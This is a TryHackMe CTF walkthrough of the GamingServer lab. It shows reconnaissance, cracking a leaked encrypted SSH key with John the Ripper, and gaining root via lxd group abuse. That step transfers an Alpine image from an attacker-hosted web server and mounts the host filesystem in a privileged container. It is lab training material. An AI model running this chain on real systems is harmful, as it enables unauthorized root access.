# GamingServer | Write-up (THM)

![Capture](https://github.com/user-attachments/assets/54b4be58-a1a8-4b92-bb5c-ca9a84c783d4)

#### Greetings, fellow cyber adventurers! Today, we embark on an exciting quest to invade the GamingServer room on TryHackMe. This boot2root challenge takes us into the world of amateur web development where vulnerabilities are waiting to be discovered in the deployment system. Join me as I uncover the secrets of this gaming server and show off our hacking skills. Let’s go!

#### First, we need to do some reconnaissance. We’ll use the popular tool Nmap to scan for open ports and services with this command:
```
─$ nmap --min-rate 1000 10.10.6.57   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:54 EAT
Nmap scan report for 10.10.6.57
Host is up (0.48s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
#### Next was a service scan on the open ports
```
─$ nmap -p22,80 -A 10.10.6.57                        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:54 EAT
Nmap scan report for 10.10.6.57
Host is up (0.56s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### Port 80 (HTTP)

Service inspection reveals that the game server is running on an Apache HTTP server on port 80. The page address is "House of danak". Further investigation is required to determine if there are any vulnerabilities that could be exploited to gain access to the server.

#### When I viewed the source of the page, I found an interesting comment. We have a username John.
![1](https://github.com/user-attachments/assets/aa88eb97-b77e-4223-8f78-c9a309496081)

#### I checked /robots.txt and found a directory with /uploads/
![Capture2](https://github.com/user-attachments/assets/1863d4fe-509b-4035-a1cc-e6a23fa5c9fd)

#### When I got to the downloads directory, I found 3 files (list, txt, and jpg). I downloaded them to my local machine.
![Capture3](https://github.com/user-attachments/assets/cb435b6c-b37d-474b-9eb8-d6d9f9adb815)

#### I then ran Gobuster to brute force for any available directories

```
└─$ gobuster dir -u 10.10.6.57 --wordlist=/usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.6.57
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 309] [--> http://10.10.6.57/secret/]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://10.10.6.57/uploads/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
#### On accessing /secret. There is a file secretKey. On viewing the file it is an encrypted rsa key

```
└─$ cat secretKey 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```
#### So I used ssh2john to make it readable by John The Ripper.
```
─$ ssh2john secretKey > pass.hash     
                                                                                                                    
┌──(kali㉿kali)-[~/Downloads/THM/GamingServer]
└─$ ls
dict.lst  hydra.restore  manifesto.txt  meme.jpg  pass.hash  secretKey
                                                                                                                    
┌──(kali㉿kali)-[~/Downloads/THM/GamingServer]
└─$ cat pass.hash            
secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
```
#### I used John to crack the hash
```
└─$ john pass.hash                                                       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
(REDACTED)          (secretKey)     
1g 0:00:00:00 DONE 2/3 (2023-09-10 18:28) 50.00g/s 47150p/s 47150c/s 47150C/s 123456..maggie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
#### I gave the secret key file the correct permissions in a way that made me have full access to read and modify the file.

```
chmod 600 secretKey
```
#### Then I logged into the machine via ssh using john as the user and the identity file secretKey
```
└─$ ssh -i secretKey john@10.10.6.57
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 10 15:36:45 UTC 2023

  System load:  0.0               Processes:           97
  Usage of /:   41.2% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.6.57
  Swap usage:   0%

0 packages can be updated.
0 updates are security updates.

Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$
```
#### I found the user.txt
```
john@exploitable:~$ cat user.txt 
(REDACTED)
```
#### I started looking into how to escalate privileges. I couldn't run sudo -l, so I checked the user and group information, which can be especially important when managing permissions and access control.
```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
#### The lxd group seemed important so I checked it out.
```
john@exploitable:~$ lxd
Error: This must be run as root
```
#### On reading around I found a way it can be used to escalate privileges on [Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/). 
#### First I downloaded lxd apline builder
```
└─$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine     
--2023-09-10 18:51:10--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8060 (7.9K) [text/plain]
Saving to: ‘build-alpine.1’

build-alpine.1               100%[==============================================>]   7.87K  --.-KB/s    in 0s

```
#### I built the file using the command
```
sudo bash build-alpine
```
#### I got a .tar.gz file which I transferred to my attacker machine
```
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
```
#### I created a web server to use to transfer the file into my victim machine then uploaded the file
```
└─$ sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.6.57 - - [10/Sep/2023 19:10:35] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
```
#### I downloaded it on the victim's device.
```
john@exploitable:/tmp$ wget 10.*.*.*:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2023-09-10 16:10:35--  http://10.13.34.70:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.*.*.*:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218 100%[==============================================>]   3.11M   330KB/s    in 11s     

2023-09-10 16:10:47 (292 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
```
#### I then started building the image file in the victim’s machine
```
john@exploitable:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 10, 2023 at 4:15pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
```
#### On running lxc exec ignite /bin/sh I got root
```
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # whoami
root
~ # pwd
/root
~ # id
uid=0(root) gid=0(root)
```
#### I then got the flag on the /mnt directory where we had mounted our root folder to from this earlier command
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```
####  the flag
```
/mnt/root # cd ..
/mnt # ls
root
/mnt # cat root/root/root.txt 
(REDACTED)
```

